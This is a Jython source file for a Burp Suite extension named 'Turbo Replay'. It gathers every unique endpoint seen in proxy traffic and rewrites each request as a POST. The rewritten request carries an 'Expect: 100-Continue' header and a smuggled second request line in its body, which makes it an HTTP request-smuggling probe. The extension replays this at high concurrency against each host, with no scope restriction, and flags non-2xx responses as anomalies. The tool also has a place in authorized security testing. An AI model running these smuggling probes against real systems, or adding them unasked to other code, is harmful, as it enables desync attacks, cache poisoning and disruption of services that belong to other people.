# Burp Suite Extension: Turbo Replay
# Jython-compatible Python extension that monitors proxy traffic,
# collects unique endpoints, mutates requests, and replays them
# at high concurrency (Turbo Intruder-style).

from burp import IBurpExtender, IProxyListener, ITab, IHttpListener
from javax.swing import (
    JPanel, JTable, JScrollPane, JButton, JLabel, JTextField,
    JTextArea, BorderFactory, SwingUtilities, SwingWorker,
    ListSelectionModel, BoxLayout, Box
)
from javax.swing.table import AbstractTableModel, DefaultTableCellRenderer
from java.awt import BorderLayout, FlowLayout, GridBagLayout, GridBagConstraints, Insets, Font, Color, Dimension
from java.lang import Runnable, String, Integer
from java.net import URL
from java.util.concurrent import Executors, CountDownLatch, atomic
import threading
import re
import time
from urlparse import urlparse


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SMUGGLE_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n"
SMUGGLE_BODY_BYTES = len(SMUGGLE_BODY.encode("ascii"))

STATUS_PENDING = "Pending"
STATUS_RUNNING = "Running"
STATUS_COMPLETED = "Completed"
STATUS_ERROR = "Error"

DEFAULT_REPLAY_COUNT = 100
DEFAULT_THREAD_COUNT = 10


# ---------------------------------------------------------------------------
# Helper: normalize a URL path for deduplication
# ---------------------------------------------------------------------------
def normalize_path(raw_url):
    """Return the path portion only, stripped of query/fragment, with
    trailing slash removed (except for root '/')."""
    # raw_url may be a full URL or just a path
    if raw_url.startswith("http://") or raw_url.startswith("https://"):
        parsed = urlparse(raw_url)
        path = parsed.path
    else:
        path = raw_url.split("?")[0].split("#")[0]

    # Strip trailing slash unless root
    if path != "/" and path.endswith("/"):
        path = path.rstrip("/")

    return path if path else "/"


# ---------------------------------------------------------------------------
# Data model for one endpoint
# ---------------------------------------------------------------------------
class EndpointEntry(object):
    def __init__(self, path, host, method, replay_count, raw_request, http_service):
        self.path = path
        self.host = host
        self.method = method            # original HTTP method
        self.replay_count = replay_count
        self.status = STATUS_PENDING
        self.raw_request = raw_request   # byte[] of the original request
        self.http_service = http_service
        self.results = {}                # status_code -> count
        self.error_msg = ""


# ---------------------------------------------------------------------------
# Swing table model
# ---------------------------------------------------------------------------
COLUMNS = ["Path", "Host", "Original Method", "Replay Count", "Status"]


class EndpointTableModel(AbstractTableModel):
    def __init__(self):
        self.entries = []          # list of EndpointEntry
        self._lock = threading.Lock()

    # --- AbstractTableModel interface ---
    def getRowCount(self):
        return len(self.entries)

    def getColumnCount(self):
        return len(COLUMNS)

    def getColumnName(self, col):
        return COLUMNS[col]

    def getValueAt(self, row, col):
        if row >= len(self.entries):
            return ""
        e = self.entries[row]
        if col == 0:
            return e.path
        elif col == 1:
            return e.host
        elif col == 2:
            return e.method
        elif col == 3:
            return Integer(e.replay_count)
        elif col == 4:
            return e.status
        return ""

    def setValueAt(self, value, row, col):
        if col == 3:
            try:
                v = int(str(value))
                if v < 1:
                    v = 1
                self.entries[row].replay_count = v
                self.fireTableCellUpdated(row, col)
            except (ValueError, TypeError):
                pass

    def isCellEditable(self, row, col):
        return col == 3  # only replay count is editable

    def getColumnClass(self, col):
        if col == 3:
            return Integer
        return String

    # --- custom helpers ---
    def add_entry(self, entry):
        with self._lock:
            self.entries.append(entry)
            idx = len(self.entries) - 1
        self.fireTableRowsInserted(idx, idx)

    def clear(self):
        with self._lock:
            n = len(self.entries)
            self.entries = []
        if n > 0:
            self.fireTableRowsDeleted(0, n - 1)

    def update_status(self, row):
        self.fireTableRowsUpdated(row, row)


# ---------------------------------------------------------------------------
# Request builder: mutate an original request
# ---------------------------------------------------------------------------
def build_smuggle_request(helpers, raw_request, http_service):
    """Take the original raw request bytes and return a new byte[] with:
    - Method changed to POST
    - Expect: 100-Continue header added/replaced
    - Content-Length set to body length
    - Body replaced with SMUGGLE_BODY
    """
    analyzed = helpers.analyzeRequest(http_service, raw_request)
    headers = list(analyzed.getHeaders())  # first element is request line

    # --- Fix the request line ---
    request_line = headers[0]
    parts = request_line.split(" ")
    # Replace method with POST
    parts[0] = "POST"
    headers[0] = " ".join(parts)

    # --- Process remaining headers ---
    new_headers = [headers[0]]
    has_expect = False
    has_cl = False
    for h in headers[1:]:
        lower = h.lower()
        if lower.startswith("expect:"):
            new_headers.append("Expect: 100-Continue")
            has_expect = True
        elif lower.startswith("content-length:"):
            new_headers.append("Content-Length: %d" % SMUGGLE_BODY_BYTES)
            has_cl = True
        elif lower.startswith("content-type:"):
            # Keep content-type if present, or skip — keep it
            new_headers.append(h)
        else:
            new_headers.append(h)

    if not has_expect:
        new_headers.append("Expect: 100-Continue")
    if not has_cl:
        new_headers.append("Content-Length: %d" % SMUGGLE_BODY_BYTES)

    body_bytes = helpers.stringToBytes(SMUGGLE_BODY)
    return helpers.buildHttpMessage(new_headers, body_bytes)


# ---------------------------------------------------------------------------
# Replay worker (runs in a background thread)
# ---------------------------------------------------------------------------
class ReplayTask(object):
    def __init__(self, extender, entry, row_index):
        self.extender = extender
        self.entry = entry
        self.row = row_index

    def run(self):
        entry = self.entry
        helpers = self.extender._helpers
        callbacks = self.extender._callbacks

        try:
            modified = build_smuggle_request(
                helpers, entry.raw_request, entry.http_service
            )
        except Exception as ex:
            entry.status = STATUS_ERROR
            entry.error_msg = "Build error: %s" % str(ex)
            self._update_ui()
            self._log_result()
            return

        entry.status = STATUS_RUNNING
        self._update_ui()

        count = entry.replay_count
        results = {}

        # Use a thread pool for concurrent replay
        thread_count = self.extender.thread_count
        pool = Executors.newFixedThreadPool(thread_count)
        latch = CountDownLatch(count)
        results_lock = threading.Lock()

        class SendOne(Runnable):
            def run(self_inner):
                try:
                    resp = callbacks.makeHttpRequest(
                        entry.http_service, modified
                    )
                    resp_bytes = resp.getResponse()
                    if resp_bytes:
                        analyzed_resp = helpers.analyzeResponse(resp_bytes)
                        code = analyzed_resp.getStatusCode()
                    else:
                        code = 0  # no response
                    with results_lock:
                        results[code] = results.get(code, 0) + 1
                except Exception:
                    with results_lock:
                        results[-1] = results.get(-1, 0) + 1
                finally:
                    latch.countDown()

        for _ in range(count):
            pool.submit(SendOne())

        latch.await()
        pool.shutdown()

        entry.results = results
        entry.status = STATUS_COMPLETED
        self._update_ui()
        self._log_result()

    def _update_ui(self):
        model = self.extender.table_model
        row = self.row

        class Updater(Runnable):
            def run(self_inner):
                model.update_status(row)

        SwingUtilities.invokeLater(Updater())

    def _log_result(self):
        entry = self.entry
        parts = []
        total = 0
        for code, cnt in sorted(entry.results.items()):
            label = str(code) if code > 0 else "Error/NoResp"
            parts.append("%s: %d" % (label, cnt))
            total += cnt

        summary = "[%s] %s  |  Total sent: %d  |  %s" % (
            entry.status,
            entry.path,
            total,
            ", ".join(parts) if parts else "N/A",
        )
        if entry.error_msg:
            summary += "  |  " + entry.error_msg

        # Flag anomalies (any non-2xx)
        anomalies = [
            (c, n) for c, n in entry.results.items() if c < 200 or c >= 300
        ]
        if anomalies:
            flags = ", ".join("%s×%d" % (c, n) for c, n in anomalies)
            summary += "  ** ANOMALY: " + flags

        extender = self.extender

        class Logger(Runnable):
            def run(self_inner):
                extender.log(summary)

        SwingUtilities.invokeLater(Logger())


# ---------------------------------------------------------------------------
# Main extension class
# ---------------------------------------------------------------------------
class BurpExtender(IBurpExtender, IProxyListener, ITab):

    # --- IBurpExtender ---
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Turbo Replay")

        self._seen_paths = {}   # (host, normalized_path) -> True
        self._seen_lock = threading.Lock()
        self.thread_count = DEFAULT_THREAD_COUNT

        # Build UI on EDT
        self.table_model = EndpointTableModel()
        self._build_ui()

        callbacks.registerProxyListener(self)
        callbacks.addSuiteTab(self)
        callbacks.printOutput("Turbo Replay extension loaded.")

    # --- ITab ---
    def getTabCaption(self):
        return "Turbo Replay"

    def getUiComponent(self):
        return self._main_panel

    # --- IProxyListener ---
    def processProxyMessage(self, is_request, message):
        if not is_request:
            return

        msg_info = message.getMessageInfo()
        request_bytes = msg_info.getRequest()
        http_service = msg_info.getHttpService()

        analyzed = self._helpers.analyzeRequest(http_service, request_bytes)
        url = analyzed.getUrl()
        method = analyzed.getMethod()

        path = normalize_path(str(url.getPath()))
        host = str(http_service.getHost())
        port = http_service.getPort()
        protocol = str(http_service.getProtocol())

        key = (host, port, path)
        with self._seen_lock:
            if key in self._seen_paths:
                return
            self._seen_paths[key] = True

        # Get default replay count from UI field
        try:
            default_count = int(self._default_count_field.getText().strip())
            if default_count < 1:
                default_count = DEFAULT_REPLAY_COUNT
        except (ValueError, TypeError):
            default_count = DEFAULT_REPLAY_COUNT

        entry = EndpointEntry(
            path=path,
            host="%s://%s:%d" % (protocol, host, port) if port not in (80, 443) else "%s://%s" % (protocol, host),
            method=method,
            replay_count=default_count,
            raw_request=request_bytes,
            http_service=http_service,
        )

        class AddRow(Runnable):
            def __init__(self_inner, model, entry):
                self_inner.model = model
                self_inner.entry = entry

            def run(self_inner):
                self_inner.model.add_entry(self_inner.entry)

        SwingUtilities.invokeLater(AddRow(self.table_model, entry))

    # --- UI construction ---
    def _build_ui(self):
        self._main_panel = JPanel(BorderLayout(5, 5))
        self._main_panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        # --- Top controls ---
        top = JPanel(FlowLayout(FlowLayout.LEFT, 8, 4))

        top.add(JLabel("Default Replay Count:"))
        self._default_count_field = JTextField(str(DEFAULT_REPLAY_COUNT), 6)
        top.add(self._default_count_field)

        top.add(JLabel("  Threads:"))
        self._thread_field = JTextField(str(DEFAULT_THREAD_COUNT), 4)
        top.add(self._thread_field)

        top.add(Box.createHorizontalStrut(20))

        btn_start_all = JButton("Start All", actionPerformed=self._on_start_all)
        top.add(btn_start_all)

        btn_start_sel = JButton("Start Selected", actionPerformed=self._on_start_selected)
        top.add(btn_start_sel)

        btn_clear = JButton("Clear", actionPerformed=self._on_clear)
        top.add(btn_clear)

        self._main_panel.add(top, BorderLayout.NORTH)

        # --- Table ---
        self._table = JTable(self.table_model)
        self._table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
        self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)

        # Column widths
        col_model = self._table.getColumnModel()
        col_model.getColumn(0).setPreferredWidth(300)  # Path
        col_model.getColumn(1).setPreferredWidth(200)  # Host
        col_model.getColumn(2).setPreferredWidth(80)   # Method
        col_model.getColumn(3).setPreferredWidth(90)   # Replay Count
        col_model.getColumn(4).setPreferredWidth(90)   # Status

        # Color status column
        class StatusRenderer(DefaultTableCellRenderer):
            def getTableCellRendererComponent(self_inner, table, value, is_sel, has_focus, row, col):
                comp = DefaultTableCellRenderer.getTableCellRendererComponent(
                    self_inner, table, value, is_sel, has_focus, row, col
                )
                if value == STATUS_COMPLETED:
                    comp.setForeground(Color(0, 128, 0))
                elif value == STATUS_RUNNING:
                    comp.setForeground(Color(0, 0, 200))
                elif value == STATUS_ERROR:
                    comp.setForeground(Color(200, 0, 0))
                else:
                    comp.setForeground(Color.DARK_GRAY)
                return comp

        col_model.getColumn(4).setCellRenderer(StatusRenderer())

        table_scroll = JScrollPane(self._table)
        table_scroll.setPreferredSize(Dimension(900, 350))

        # --- Log area ---
        self._log_area = JTextArea()
        self._log_area.setEditable(False)
        self._log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        log_scroll = JScrollPane(self._log_area)
        log_scroll.setPreferredSize(Dimension(900, 200))
        log_scroll.setBorder(BorderFactory.createTitledBorder("Replay Results / Log"))

        # Split the center
        from javax.swing import JSplitPane
        split = JSplitPane(JSplitPane.VERTICAL_SPLIT, table_scroll, log_scroll)
        split.setResizeWeight(0.6)
        self._main_panel.add(split, BorderLayout.CENTER)

    # --- Button handlers ---
    def _read_thread_count(self):
        try:
            tc = int(self._thread_field.getText().strip())
            if tc < 1:
                tc = DEFAULT_THREAD_COUNT
            self.thread_count = tc
        except (ValueError, TypeError):
            self.thread_count = DEFAULT_THREAD_COUNT

    def _on_start_all(self, event):
        self._read_thread_count()
        entries = self.table_model.entries
        for i, e in enumerate(entries):
            if e.status == STATUS_PENDING:
                self._launch_replay(e, i)

    def _on_start_selected(self, event):
        self._read_thread_count()
        rows = self._table.getSelectedRows()
        for r in rows:
            e = self.table_model.entries[r]
            if e.status == STATUS_PENDING:
                self._launch_replay(e, r)

    def _on_clear(self, event):
        with self._seen_lock:
            self._seen_paths.clear()
        self.table_model.clear()
        self._log_area.setText("")

    def _launch_replay(self, entry, row):
        task = ReplayTask(self, entry, row)
        t = threading.Thread(target=task.run)
        t.daemon = True
        t.start()

    def log(self, msg):
        self._log_area.append(msg + "\n")
        # Auto-scroll to bottom
        self._log_area.setCaretPosition(self._log_area.getDocument().getLength())
